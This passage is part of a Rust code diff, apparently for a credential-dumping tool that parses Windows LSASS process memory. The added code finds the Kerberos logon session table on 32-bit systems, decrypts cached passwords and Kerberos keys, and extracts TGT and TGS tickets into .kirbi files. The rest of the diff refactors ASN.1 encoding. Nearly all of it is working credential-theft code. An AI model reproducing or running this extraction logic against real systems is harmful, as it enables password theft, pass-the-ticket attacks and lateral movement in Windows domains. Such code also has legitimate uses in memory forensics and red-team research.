+                    Ok(s) if s > 0 && s <= 256 => s as usize,
+                    _ => break,
+                };
+                let checksum_ptr = match vmem.read_virt_u64(generic_base + 0x10) {
+                    Ok(p) if p > 0x10000 && (p >> 48) == 0 => p,
+                    _ => break,
+                };
+
+                let enc_key_data = match vmem.read_virt_bytes(checksum_ptr, key_size) {
+                    Ok(d) => d,
+                    Err(_) => {
+                        log::debug!(
+                            "Kerberos key vmem scan: key data read failed at 0x{:x} (paged out?)",
+                            checksum_ptr
+                        );
+                        continue;
+                    }
+                };
+                let decrypted =
+                    match crate::lsass::crypto::decrypt_credential(keys, &enc_key_data) {
+                        Ok(d) => d,
+                        Err(_) => {
+                            log::debug!(
+                                "Kerberos key vmem scan: decrypt failed for etype {} at 0x{:x}",
+                                etype,
+                                checksum_ptr
+                            );
+                            continue;
+                        }
+                    };
+
+                let expected_len = match etype {
+                    17 => 16,
+                    18 => 32,
+                    23 | 24 => 16,
+                    1 | 3 => 8,
+                    _ => continue,
+                };
+                if decrypted.len() < expected_len {
+                    break;
+                }
+                let key_bytes = decrypted[..expected_len].to_vec();
+                if key_bytes.iter().all(|&b| b == 0) {
+                    continue;
+                }
+                valid_count += 1;
+                key_group.push(KerberosKey { etype, key: key_bytes });
+            }
+
+            if valid_count > 0 {
+                break;
+            }
+        }
+
+        if key_group.is_empty() {
+            continue;
+        }
+
+        let sig: Vec<u8> = key_group.iter().flat_map(|k| &k.key).copied().collect();
+        if !seen_keys.insert(sig) {
+            continue;
+        }
+
+        log::info!(
+            "Kerberos key vmem scan: found {} keys at 0x{:x} (etypes: {})",
+            key_group.len(),
+            vaddr,
+            key_group
+                .iter()
+                .map(|k| format!("{}", k.etype))
+                .collect::<Vec<_>>()
+                .join(",")
+        );
+
+        all_key_groups.push(key_group);
+    }
+
+    log::info!(
+        "Kerberos key vmem scan: {} unique key groups found",
+        all_key_groups.len()
+    );
+
+    all_key_groups
+}
+
+// -- x86-aware extraction --
+
+/// Extract Kerberos credentials — architecture-aware variant.
+pub fn extract_kerberos_credentials_arch(
+    vmem: &dyn VirtualMemory,
+    kerberos_base: u64,
+    _kerberos_size: u32,
+    keys: &CryptoKeys,
+    arch: Arch,
+) -> Result<Vec<(u64, KerberosCredential)>> {
+    if arch == Arch::X64 {
+        return extract_kerberos_credentials(vmem, kerberos_base, _kerberos_size, keys);
+    }
+
+    let pe = PeHeaders::parse_from_memory(vmem, kerberos_base)?;
+    let mut results = Vec::new();
+
+    let text = match pe.find_section(".text") {
+        Some(s) => s,
+        None => return Ok(results),
+    };
+    let text_base = kerberos_base + text.virtual_address as u64;
+
+    let (pattern_addr, _) = match patterns::find_pattern(
+        vmem, text_base, text.virtual_size,
+        patterns::KERBEROS_LOGON_SESSION_PATTERNS_X86,
+        "KerbGlobalLogonSessionTable_x86",
+    ) {
+        Ok(r) => r,
+        Err(e) => {
+            log::info!("Could not find Kerberos x86 pattern: {}", e);
+            return Ok(results);
+        }
+    };
+
+    // Find AVL table via absolute addressing (x86)
+    let data_sec = pe.find_section(".data");
+    let table_addr = if let Some(ds) = data_sec {
+        let data_base = kerberos_base + ds.virtual_address as u64;
+        let data_end = data_base + ds.virtual_size as u64;
+        patterns::find_list_via_abs(vmem, pattern_addr, kerberos_base, data_base, data_end, "kerberos_x86")?
+    } else {
+        return Ok(results);
+    };
+    log::info!("Kerberos x86 session table at 0x{:x}", table_addr);
+
+    // x86 RTL_AVL_TABLE: BalancedRoot = RTL_BALANCED_LINKS (0x10 bytes on x86)
+    //   +0x00: Parent (4B)
+    //   +0x04: LeftChild (4B)
+    //   +0x08: RightChild (4B)
+    //   +0x0C: Balance (1B+3pad)
+    // NumberGenericTableElements at +0x18
+    let left_child = read_ptr(vmem, table_addr + 0x04, arch).unwrap_or(0);
+    let right_child = read_ptr(vmem, table_addr + 0x08, arch).unwrap_or(0);
+    let num_elements = vmem.read_virt_u32(table_addr + 0x18).unwrap_or(0);
+
+    log::info!("Kerberos x86 AVL: elements={}, Left=0x{:x}, Right=0x{:x}",
+        num_elements, left_child, right_child);
+
+    let root_node = right_child;
+    if (root_node == 0 || root_node == table_addr) && (left_child == 0 || left_child == table_addr) {
+        return Ok(results);
+    }
+
+    let mut nodes = Vec::new();
+    walk_avl_tree_x86(vmem, root_node, table_addr, &mut nodes, 0);
+    log::info!("Kerberos x86 AVL tree: {} nodes", nodes.len());
+
+    let (offsets, variant_idx) = detect_kerb_offsets_x86(vmem, &nodes);
+    let ticket_offsets = if variant_idx == 0 { &TICKET_OFFSETS_1607_X86 } else { &TICKET_OFFSETS_10_X86 };
+    let key_entry_offsets = if variant_idx == 0 { &KEY_ENTRY_1607_X86 } else { &KEY_ENTRY_PRE1607_X86 };
+
+    for node_ptr in &nodes {
+        // x86: OrderedPointer at node + 0x10 (was +0x20 on x64)
+        let entry = match read_ptr(vmem, node_ptr + 0x10, arch) {
+            Ok(p) if is_valid_user_ptr(p, arch) => p,
+            _ => continue,
+        };
+        let luid = vmem.read_virt_u64(entry + offsets.luid).unwrap_or(0);
+        if luid == 0 || luid > 0xFFFF_FFFF {
+            continue;
+        }
+
+        let cred_addr = entry + offsets.credentials;
+        let username = read_ustring(vmem, cred_addr, arch).unwrap_or_default();
+        let domain = read_ustring(vmem, cred_addr + arch.ustr_size(), arch).unwrap_or_default();
+
+        if !username.is_empty() && !is_plausible_username(&username) {
+            continue;
+        }
+
+        let password = if !username.is_empty() {
+            extract_kerb_password_x86(vmem, cred_addr, offsets.cred_password, keys, arch)
+                .unwrap_or_default()
+        } else {
+            String::new()
+        };
+
+        let kerb_keys = extract_kerb_keys_x86(vmem, entry, offsets, key_entry_offsets, keys, arch);
+
+        let mut tickets = Vec::new();
+        let ticket_lists = [
+            (entry + offsets.tickets_1, KerberosTicketType::Tgt),
+            (entry + offsets.tickets_2, KerberosTicketType::Tgs),
+            (entry + offsets.tickets_3, KerberosTicketType::Client),
+        ];
+        for &(list_head, ticket_type) in &ticket_lists {
+            extract_tickets_from_list_x86(vmem, list_head, ticket_type, ticket_offsets, &mut tickets, arch);
+        }
+
+        if username.is_empty() && kerb_keys.is_empty() && tickets.is_empty() {
+            continue;
+        }
+
+        log::info!("Kerberos x86: LUID=0x{:x} user={} domain={} keys={} tickets={}",
+            luid,
+            if username.is_empty() { "(paged)" } else { &username },
+            if domain.is_empty() { "(paged)" } else { &domain },
+            kerb_keys.len(), tickets.len()
+        );
+
+        results.push((luid, KerberosCredential {
+            username, domain, password,
+            keys: kerb_keys,
+            tickets,
+        }));
+    }
+
+    log::info!("Kerberos x86: found {} entries", results.len());
+    Ok(results)
+}
+
+/// Walk AVL tree with x86 pointer sizes.
+fn walk_avl_tree_x86(
+    vmem: &dyn VirtualMemory,
+    node: u64,
+    sentinel: u64,
+    results: &mut Vec<u64>,
+    depth: usize,
+) {
+    if depth > 30 || node == 0 || node == sentinel || results.len() > 256 {
+        return;
+    }
+    if results.contains(&node) {
+        return;
+    }
+    // x86 RTL_BALANCED_LINKS: Left at +0x04, Right at +0x08
+    let left = read_ptr(vmem, node + 0x04, Arch::X86).unwrap_or(0);
+    let right = read_ptr(vmem, node + 0x08, Arch::X86).unwrap_or(0);
+    walk_avl_tree_x86(vmem, left, sentinel, results, depth + 1);
+    results.push(node);
+    walk_avl_tree_x86(vmem, right, sentinel, results, depth + 1);
+}
+
+/// Auto-detect Kerberos x86 offset variant.
+fn detect_kerb_offsets_x86(vmem: &dyn VirtualMemory, nodes: &[u64]) -> (&'static KerbOffsets, usize) {
+    for node_ptr in nodes {
+        let entry = match read_ptr(vmem, node_ptr + 0x10, Arch::X86) {
+            Ok(p) if is_valid_user_ptr(p, Arch::X86) => p,
+            _ => continue,
+        };
+        for (idx, variant) in KERB_OFFSET_VARIANTS_X86.iter().enumerate() {
+            let luid = match vmem.read_virt_u64(entry + variant.luid) {
+                Ok(l) if l > 0 && l <= 0xFFFF_FFFF => l,
+                _ => continue,
+            };
+            let cred_addr = entry + variant.credentials;
+            let username = read_ustring(vmem, cred_addr, Arch::X86).unwrap_or_default();
+            if !username.is_empty() && username.len() < 256 {
+                log::debug!("Kerberos x86: auto-detected variant {} (luid=0x{:x})", idx, luid);
+                return (variant, idx);
+            }
+        }
+    }
+    (&KERB_OFFSET_VARIANTS_X86[0], 0)
+}
+
+/// Extract Kerberos password from x86 credential structure.
+fn extract_kerb_password_x86(
+    vmem: &dyn VirtualMemory,
+    cred_ptr: u64,
+    password_offset: u64,
+    keys: &CryptoKeys,
+    arch: Arch,
+) -> Result<String> {
+    let pwd_len = vmem.read_virt_u16(cred_ptr + password_offset)? as usize;
+    let pwd_max_len = vmem.read_virt_u16(cred_ptr + password_offset + 2)? as usize;
+    // x86: buffer pointer at +4 (not +8)
+    let pwd_ptr = read_ptr(vmem, cred_ptr + password_offset + 4, arch)?;
+
+    if pwd_len == 0 || pwd_ptr == 0 {
+        return Ok(String::new());
+    }
+    let read_len = if pwd_max_len >= pwd_len { pwd_max_len } else { pwd_len };
+    let enc_data = vmem.read_virt_bytes(pwd_ptr, read_len)?;
+    let decrypted = crate::lsass::crypto::decrypt_credential(keys, &enc_data)?;
+    Ok(crate::lsass::crypto::decode_utf16_le(&decrypted))
+}
+
+/// Extract Kerberos keys with x86 pointer sizes.
+fn extract_kerb_keys_x86(
+    vmem: &dyn VirtualMemory,
+    entry: u64,
+    offsets: &KerbOffsets,
+    key_entry_offsets: &KerbKeyEntryOffsets,
+    keys: &CryptoKeys,
+    arch: Arch,
+) -> Vec<KerberosKey> {
+    let key_list_ptr = match read_ptr(vmem, entry + offsets.key_list_ptr, arch) {
+        Ok(p) if is_valid_user_ptr(p, arch) => p,
+        _ => return Vec::new(),
+    };
+
+    let cb_item = match vmem.read_virt_u32(key_list_ptr + 0x04) {
+        Ok(n) if n > 0 && n <= 32 => n as usize,
+        _ => return Vec::new(),
+    };
+
+    let mut result = Vec::new();
+    // x86: entries start at +0x18 (was +0x28 on x64, fewer PVOIDs in header)
+    let entries_base = key_list_ptr + 0x18;
+
+    for i in 0..cb_item {
+        let entry_base = entries_base + (i as u64) * key_entry_offsets.entry_size;
+        let generic_base = entry_base + key_entry_offsets.generic_offset;
+
+        // x86 KERB_HASHPASSWORD_GENERIC:
+        //   +0x00: unk (u32, always 2)
+        //   +0x04: Type (u32, etype)
+        //   +0x08: Size (SIZE_T=4 on x86)
+        //   +0x0C: Checksump (PVOID=4 on x86)
+        let etype = match vmem.read_virt_u32(generic_base + 0x04) {
+            Ok(t) => t,
+            Err(_) => continue,
+        };
+        let key_size = match vmem.read_virt_u32(generic_base + 0x08) {
+            Ok(s) if s > 0 && s <= 256 => s as usize,
+            _ => continue,
+        };
+        let checksum_ptr = match read_ptr(vmem, generic_base + 0x0C, arch) {
+            Ok(p) if is_valid_user_ptr(p, arch) => p,
+            _ => continue,
+        };
+
+        let enc_key_data = match vmem.read_virt_bytes(checksum_ptr, key_size) {
+            Ok(d) => d,
+            Err(_) => continue,
+        };
+        let decrypted = match crate::lsass::crypto::decrypt_credential(keys, &enc_key_data) {
+            Ok(d) => d,
+            Err(_) => continue,
+        };
+
+        let expected_len = match etype {
+            17 => 16, 18 => 32, 23 | 24 => 16, 3 | 1 => 8,
+            0xFFFF_FF7B | 0xFFFF_FF79 => 16, 0xFFFF_FF80 | 0xFFFF_FF74 => 16,
+            _ => continue,
+        };
+        if decrypted.len() < expected_len {
+            continue;
+        }
+        let key_bytes = decrypted[..expected_len].to_vec();
+        if key_bytes.iter().all(|&b| b == 0) {
+            continue;
+        }
+        if super::msv::is_repeating_pattern_pub(&key_bytes) {
+            continue;
+        }
+
+        result.push(KerberosKey { etype, key: key_bytes });
+    }
+    result
+}
+
+/// Walk a ticket linked list with x86 pointer sizes.
+fn extract_tickets_from_list_x86(
+    vmem: &dyn VirtualMemory,
+    list_head: u64,
+    ticket_type: KerberosTicketType,
+    offsets: &TicketOffsets,
+    tickets: &mut Vec<KerberosTicket>,
+    arch: Arch,
+) {
+    let flink = match read_ptr(vmem, list_head, arch) {
+        Ok(f) if f != 0 && f != list_head => f,
+        _ => return,
+    };
+
+    let mut current = flink;
+    let mut count = 0u32;
+    while current != list_head && current != 0 && count < 64 {
+        count += 1;
+        if let Some(ticket) = extract_single_ticket_x86(vmem, current, ticket_type, offsets, arch) {
+            tickets.push(ticket);
+        }
+        current = read_ptr(vmem, current, arch).unwrap_or(0);
+    }
+}
+
+/// Extract a single ticket with x86 pointer sizes.
+fn extract_single_ticket_x86(
+    vmem: &dyn VirtualMemory,
+    ticket_addr: u64,
+    ticket_type: KerberosTicketType,
+    offsets: &TicketOffsets,
+    arch: Arch,
+) -> Option<KerberosTicket> {
+    let svc_name_ptr = read_ptr(vmem, ticket_addr + offsets.service_name_ptr, arch).ok()?;
+    let (service_name, service_name_type) = read_kerb_external_name_x86(vmem, svc_name_ptr, arch);
+
+    let client_name_ptr = read_ptr(vmem, ticket_addr + offsets.client_name_ptr, arch).ok()?;
+    let (client_name, client_name_type) = read_kerb_external_name_x86(vmem, client_name_ptr, arch);
+
+    let domain_name = read_ustring(vmem, ticket_addr + offsets.domain_name, arch).unwrap_or_default();
+    let target_domain_name = read_ustring(vmem, ticket_addr + offsets.target_domain_name, arch).unwrap_or_default();
+
+    let ticket_flags = vmem.read_virt_u32(ticket_addr + offsets.ticket_flags).unwrap_or(0).swap_bytes();
+    let key_type = vmem.read_virt_u32(ticket_addr + offsets.key_type).unwrap_or(0);
+    let key_length = vmem.read_virt_u32(ticket_addr + offsets.key_length).unwrap_or(0) as usize;
+    let key_value_ptr = read_ptr(vmem, ticket_addr + offsets.key_value, arch).unwrap_or(0);
+    let session_key = if key_length > 0 && key_length <= 256 && key_value_ptr != 0 {
+        vmem.read_virt_bytes(key_value_ptr, key_length).unwrap_or_default()
+    } else {
+        Vec::new()
+    };
+
+    let start_time = vmem.read_virt_u64(ticket_addr + offsets.start_time).unwrap_or(0);
+    let end_time = vmem.read_virt_u64(ticket_addr + offsets.end_time).unwrap_or(0);
+    let renew_until = vmem.read_virt_u64(ticket_addr + offsets.renew_until).unwrap_or(0);
+
+    let ticket_enc_type = vmem.read_virt_u32(ticket_addr + offsets.ticket_enc_type).unwrap_or(0);
+    let ticket_kvno = vmem.read_virt_u32(ticket_addr + offsets.ticket_kvno).unwrap_or(0);
+    let ticket_length = vmem.read_virt_u32(ticket_addr + offsets.ticket_length).unwrap_or(0) as usize;
+    let ticket_value_ptr = read_ptr(vmem, ticket_addr + offsets.ticket_value, arch).unwrap_or(0);
+    let ticket_blob = if ticket_length > 0 && ticket_length <= 65536 && ticket_value_ptr != 0 {
+        vmem.read_virt_bytes(ticket_value_ptr, ticket_length).unwrap_or_default()
+    } else {
+        Vec::new()
+    };
+
+    if service_name.is_empty() && domain_name.is_empty() { return None; }
+    if ticket_blob.is_empty() { return None; }
+    let zero_count = ticket_blob.iter().filter(|&&b| b == 0).count();
+    if zero_count > ticket_blob.len() * 3 / 4 { return None; }
+    if key_type > 0xFF { return None; }
+    if start_time == 0 && end_time == 0 && renew_until == 0 { return None; }
+
+    let kirbi = build_kirbi(
+        &service_name, service_name_type, &client_name, client_name_type,
+        &domain_name, &target_domain_name, ticket_flags, key_type, &session_key,
+        start_time, end_time, renew_until, ticket_enc_type, ticket_kvno, &ticket_blob,
+    );
+
+    Some(KerberosTicket {
+        ticket_type, service_name, service_name_type, client_name, client_name_type,
+        domain_name, target_domain_name, ticket_flags, key_type, session_key,
+        start_time, end_time, renew_until, ticket_enc_type, ticket_kvno,
+        ticket_blob, kirbi,
+    })
+}
+
+/// Read KERB_EXTERNAL_NAME with x86 pointer sizes.
+/// x86: Names array at +0x04 (aligned to 4), UNICODE_STRING is 8 bytes.
+fn read_kerb_external_name_x86(vmem: &dyn VirtualMemory, ptr: u64, arch: Arch) -> (Vec<String>, i16) {
+    if ptr == 0 || !is_valid_user_ptr(ptr, arch) {
+        return (Vec::new(), 0);
+    }
+    let name_type = vmem.read_virt_u16(ptr).unwrap_or(0) as i16;
+    let name_count = vmem.read_virt_u16(ptr + 2).unwrap_or(0) as usize;
+    if name_count == 0 || name_count > 16 {
+        return (Vec::new(), name_type);
+    }
+    // x86: Names start at +0x04 (4-byte aligned), each UNICODE_STRING is 8 bytes
+    let mut names = Vec::with_capacity(name_count);
+    for i in 0..name_count {
+        let ustr_addr = ptr + 0x04 + (i as u64) * arch.ustr_size();
+        let name = read_ustring(vmem, ustr_addr, arch).unwrap_or_default();
+        names.push(name);
+    }
+    (names, name_type)
 }
 
 // ---- ASN.1 DER encoding for .kirbi (KRB-CRED) ----
@@ -866,41 +1821,43 @@ fn build_krb_cred_info(
     //   srealm    [8] Realm OPTIONAL,
     //   sname     [9] PrincipalName OPTIONAL
     // }
+    // Build all fields directly into a single body buffer, avoiding the intermediate
+    // Vec<Vec<u8>> + Vec<&[u8]> double allocation.
+    let mut body = Vec::with_capacity(256);
     let enc_key = build_encryption_key(key_type, key_value);
-    let mut fields: Vec<Vec<u8>> = vec![asn1_context_explicit(0, &enc_key)];
+    body.extend_from_slice(&asn1_context_explicit(0, &enc_key));
     if !prealm.is_empty() {
-        fields.push(asn1_context_explicit(1, &asn1_general_string(prealm)));
+        body.extend_from_slice(&asn1_context_explicit(1, &asn1_general_string(prealm)));
     }
     if !client_name.is_empty() {
-        fields.push(asn1_context_explicit(
+        body.extend_from_slice(&asn1_context_explicit(
             2,
             &build_principal_name(client_name_type, client_name),
         ));
     }
-    fields.push(asn1_context_explicit(3, &asn1_bitstring_u32(flags)));
+    body.extend_from_slice(&asn1_context_explicit(3, &asn1_bitstring_u32(flags)));
     if start_time != 0 {
-        fields.push(asn1_context_explicit(5, &asn1_generalized_time(start_time)));
+        body.extend_from_slice(&asn1_context_explicit(5, &asn1_generalized_time(start_time)));
     }
     if end_time != 0 {
-        fields.push(asn1_context_explicit(6, &asn1_generalized_time(end_time)));
+        body.extend_from_slice(&asn1_context_explicit(6, &asn1_generalized_time(end_time)));
     }
     if renew_until != 0 {
-        fields.push(asn1_context_explicit(
+        body.extend_from_slice(&asn1_context_explicit(
             7,
             &asn1_generalized_time(renew_until),
         ));
     }
     if !srealm.is_empty() {
-        fields.push(asn1_context_explicit(8, &asn1_general_string(srealm)));
+        body.extend_from_slice(&asn1_context_explicit(8, &asn1_general_string(srealm)));
     }
     if !sname.is_empty() {
-        fields.push(asn1_context_explicit(
+        body.extend_from_slice(&asn1_context_explicit(
             9,
             &build_principal_name(sname_type, sname),
         ));
     }
-    let refs: Vec<&[u8]> = fields.iter().map(|f| f.as_slice()).collect();
-    asn1_sequence(&refs)
+    asn1_tag_length_value(0x30, &body)
 }
 
 fn build_encryption_key(key_type: u32, key_value: &[u8]) -> Vec<u8> {
@@ -944,29 +1901,33 @@ fn build_encrypted_data_with_kvno(etype: u32, kvno: u32, cipher: &[u8]) -> Vec<u
 
 // ---- ASN.1 DER primitives ----
 
-fn asn1_length(len: usize) -> Vec<u8> {
+/// Encode ASN.1 DER length directly into the output buffer (zero allocation).
+/// Called hundreds of times per ticket; avoids a Vec<u8> allocation each time.
+fn asn1_length_into(out: &mut Vec<u8>, len: usize) {
     if len < 0x80 {
-        vec![len as u8]
+        out.push(len as u8);
     } else if len < 0x100 {
-        vec![0x81, len as u8]
+        out.extend_from_slice(&[0x81, len as u8]);
     } else if len < 0x10000 {
-        vec![0x82, (len >> 8) as u8, len as u8]
+        out.extend_from_slice(&[0x82, (len >> 8) as u8, len as u8]);
     } else if len < 0x100_0000 {
-        vec![0x83, (len >> 16) as u8, (len >> 8) as u8, len as u8]
+        out.extend_from_slice(&[0x83, (len >> 16) as u8, (len >> 8) as u8, len as u8]);
     } else {
-        vec![
+        out.extend_from_slice(&[
             0x84,
             (len >> 24) as u8,
             (len >> 16) as u8,
             (len >> 8) as u8,
             len as u8,
-        ]
+        ]);
     }
 }
 
 fn asn1_tag_length_value(tag: u8, value: &[u8]) -> Vec<u8> {
-    let mut out = vec![tag];
-    out.extend(asn1_length(value.len()));
+    // Pre-compute capacity: 1 (tag) + up to 5 (length) + value.len()
+    let mut out = Vec::with_capacity(1 + 5 + value.len());
+    out.push(tag);
+    asn1_length_into(&mut out, value.len());
     out.extend_from_slice(value);
     out
 }
@@ -991,8 +1952,9 @@ fn asn1_application(tag_num: u8, value: &[u8]) -> Vec<u8> {
         asn1_tag_length_value(0x60 | tag_num, value)
     } else {
         // Long form tag
-        let mut out = vec![0x7F, tag_num];
-        out.extend(asn1_length(value.len()));
+        let mut out = Vec::with_capacity(2 + 5 + value.len());
+        out.extend_from_slice(&[0x7F, tag_num]);
+        asn1_length_into(&mut out, value.len());
         out.extend_from_slice(value);
         out
     }
